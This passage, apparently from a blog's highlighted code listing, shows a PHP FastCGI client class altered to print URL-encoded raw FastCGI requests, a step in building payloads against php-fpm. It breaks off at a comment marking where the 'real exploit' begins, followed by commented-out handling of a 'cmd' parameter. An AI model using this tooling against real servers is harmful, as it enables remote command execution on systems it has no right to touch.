class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.urlencode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = 